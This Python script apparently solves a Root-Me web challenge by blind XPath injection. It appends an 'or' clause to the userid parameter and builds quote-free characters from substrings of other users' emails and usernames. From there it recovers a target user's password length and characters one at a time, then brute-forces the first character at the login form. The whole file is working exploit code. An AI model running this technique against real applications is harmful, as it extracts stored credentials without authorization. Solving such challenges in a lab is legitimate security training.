import requests
import string
from urllib.parse import unquote

charset = {
	'0':'string(0)',
	'1':'string(1)',
	'2':'string(2)',
	'3':'string(3)',
	'4':'string(4)',
	'5':'string(5)',
	'6':'string(6)',
	'7':'string(7)',
	'8':'string(8)',
	'9':'string(9)',
	'a':'substring(//user[3]/email,5,1)',
	'b':'substring(//user[1]/email,9,1)',
	'c':'substring(//user[1]/email,12,1)',
	'd':'substring(//user[2]/email,6,1)',
	'e':'substring(//user[1]/username,3,1)',
	'g':'substring(//user[2]/email,11,1)',
	'h':'substring(//user[2]/username,3,1)',
	'i':'substring(//user[3]/username,3,1)',
	'j':'substring(//user[1]/email,7,1)',
	'l':'substring(//user[5]/username,2,1)',
	'm':'substring(//user[4]/email,9,1)',
	'n':'substring(//user[2]/username,4,1)',
	'o':'substring(//user[2]/username,2,1)',
	'r':'substring(//user[3]/username,2,1)',
	's':'substring(//user[1]/email,1,1)',
	't':'substring(//user[1]/email,2,1)',
	'v':'substring(//user[1]/username,4,1)',
	'y':'substring(//user[4]/username,5,1)',
	'z':'substring(//user[3]/email,11,1)',
	'S':'substring(//user[1]/username,1,1)',
	'J':'substring(//user[2]/username,1,1)',
	'E':'substring(//user[3]/username,1,1)',
	'@':'substring(//user[1]/email,6,1)',
	'.':'substring(//user[1]/email,11,1)',
}

listindex=list()

for i in charset:
	listindex.append(i)

url = 'http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=9 or '

# find length:
def find_length():
	length = 0
	for i in range(1,50):
		r = requests.get(url + f"string-length(//user[2]/password)={i}")
		if "Steve" in r.text:
			length = i 
			break
	return length

#Find password
def findPassword():
	password=''
	for i in range(1,find_length()+1):
		for c in listindex:
			r = requests.get(url + f'substring(//user[2]/password,{i},1)={charset[c]}')
			if "Steve" in r.text:
				password += c
				print(str(i) + ": " + c)
				print(password)
				break
		if len(password) < i:
			password += "?"
	print(password)
	#find final password:
	password=password.replace('?','')
	for i in string.printable:
		r = requests.post('http://challenge01.root-me.org/web-serveur/ch24/?action=login',data={'username':'John','password':f"{i}{password}{unquote('%0a')}"})
		if "administrator" in r.text:
			password = i + password
			break
	return password

def main():
	print("Submit password: ",findPassword())

if __name__=='__main__':
	main()
